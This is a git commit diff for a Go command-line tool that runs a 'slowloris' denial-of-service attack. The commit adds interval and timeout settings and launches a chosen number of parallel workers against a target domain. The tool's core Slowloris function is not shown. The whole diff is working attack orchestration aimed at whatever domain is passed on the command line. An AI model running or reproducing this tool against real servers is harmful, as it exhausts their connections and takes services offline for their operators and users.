37c81ee663b6e249167271d0c07c03556dee3228
Ivaylo Tsankov <itsankoff@gmail.com>
2022-04-21 00:20:35 +0300

    * Organize distributed version of the attack

--- main.go
+++ main.go
@@ -3,11 +3,14 @@ package main
 import (
 	"flag"
 	"fmt"
+	"time"
 )
 
 func main() {
 	var domain *string = flag.String("domain", "", "Domain to perform attack")
 	var count *int64 = flag.Int64("count", int64(10), "Number of parallel workers")
+	var interval *time.Duration = flag.Duration("interval", 1*time.Second, "Interval for sending data")
+	var timeout *time.Duration = flag.Duration("timeout", 10*time.Second, "Timeout for the whole operation")
 
 	flag.Parse()
 	if !flag.Parsed() {
@@ -28,8 +31,10 @@ func main() {
 	fmt.Println("slowloris...")
 	fmt.Printf("creating zoo of %d loris for %s\n", *count, sanitized)
 	if err := Zoo(Config{
-		URL:   sanitized,
-		Count: *count,
+		URL:      sanitized,
+		Count:    *count,
+		Interval: *interval,
+		Timeout:  *timeout,
 	}); err != nil {
 		fmt.Println(err)
 	}
--- zoo.go
+++ zoo.go
@@ -9,23 +9,31 @@ import (
 
 // Config holds configuration available for constructing a slowloris zoo.
 type Config struct {
-	URL   string
-	Count int64
+	URL      string
+	Count    int64
+	Interval time.Duration
+	Timeout  time.Duration
 }
 
 // Zoo is a function that can perform distributed slow loris attack based on
 // the given parameters.
 func Zoo(c Config) error {
-	ctx := context.Background()
-	wg := sync.WaitGroup{}
+	var ctx context.Context
+	ctx = context.Background()
+	if c.Timeout != 0 {
+		ctx, _ = context.WithTimeout(ctx, c.Timeout)
+	}
 
+	wg := sync.WaitGroup{}
 	for i := int64(0); i < c.Count; i++ {
 		wg.Add(1)
 		go func(index int64) {
+			defer wg.Done()
 			fmt.Printf("slowloris %d\n", index)
-			Slowloris(ctx, c.URL)
-			time.Sleep(1 * time.Second)
-			wg.Done()
+			if err := Slowloris(ctx, index, c.Interval, c.URL); err != nil {
+				fmt.Printf("slowloris %d received err: %s\n", index, err)
+				return
+			}
 		}(i)
 	}
 
